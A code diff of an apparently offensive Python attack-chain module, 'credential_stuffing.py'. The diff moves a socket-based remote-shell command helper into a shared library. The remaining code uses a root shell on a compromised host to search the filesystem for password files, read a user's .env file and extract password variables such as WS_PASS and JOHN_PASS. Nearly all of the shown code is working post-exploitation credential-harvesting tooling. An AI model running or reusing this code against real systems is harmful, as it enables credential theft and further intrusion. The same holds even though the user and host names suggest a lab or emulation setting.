@@ -3,7 +3,7 @@ import shlex
 import socket
 import time
 
-from chainlog import log
+from chainlog import log, run_remote
 
 # =============================================================================
 # credential_stuffing.py — Discover internal credentials from john's .env
@@ -32,51 +32,6 @@ _NOISE_FILE_PATTERNS = [
     ("db_password.txt", ["/home", "/root",                     "/opt"]),
 ]
 
-
-_sentinel_seq = 0
-
-
-def _drain(shell):
-    prev = shell.gettimeout()
-    shell.settimeout(0.1)
-    while True:
-        try:
-            if not shell.recv(4096):
-                break
-        except socket.timeout:
-            break
-    shell.settimeout(prev)
-
-
-def _run_remote(shell, cmd, timeout=10):
-    """Send cmd through `shell`, return captured stdout up to a sentinel echo."""
-    global _sentinel_seq
-    _sentinel_seq += 1
-    sentinel = f"CS_SENTINEL_{_sentinel_seq:04X}_END"
-
-    _drain(shell)
-    shell.sendall(f"{cmd}\n".encode())
-    time.sleep(0.4)
-    shell.sendall(f"echo {sentinel}\n".encode())
-
-    prev_timeout = shell.gettimeout()
-    shell.settimeout(2)
-    buf = ""
-    deadline = time.time() + timeout
-    while time.time() < deadline:
-        try:
-            buf += shell.recv(4096).decode(errors="replace")
-        except socket.timeout:
-            pass
-        if sentinel in buf:
-            break
-    shell.settimeout(prev_timeout)
-
-    if sentinel in buf:
-        buf = buf[:buf.index(sentinel)]
-    buf = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", buf)
-    buf = buf.replace("\r", "")
-    return buf.strip()
 
 
 def _extract_password(env_text, var_names=("WS_PASS", "JOHN_PASS", "PASSWORD")):
@@ -112,7 +67,7 @@ def _search_noise_files(shell):
             f"find {search_dirs} -maxdepth 4 -name {shlex.quote(filename)} "
             f"-printf 'CS_NOISE_HIT %p\\n' 2>/dev/null"
         )
-        out = _run_remote(shell, cmd, timeout=10)
+        out = run_remote(shell, cmd, timeout=10)
         hits = [
             line[len("CS_NOISE_HIT "):]
             for line in out.splitlines()
@@ -148,7 +103,7 @@ def run(root_shell, target_user=TARGET_USERNAME):
     # ------------------------------------------------------------------
     _search_noise_files(root_shell)
     log(f"[*] Reading {ENV_FILE_PATH} on apache...")
-    env_blob = _run_remote(root_shell, f"cat {ENV_FILE_PATH}")
+    env_blob = run_remote(root_shell, f"cat {ENV_FILE_PATH}", timeout=10)
     password = _extract_password(env_blob)
     if not password:
         log(f"[-] No usable password variable found in {ENV_FILE_PATH}")
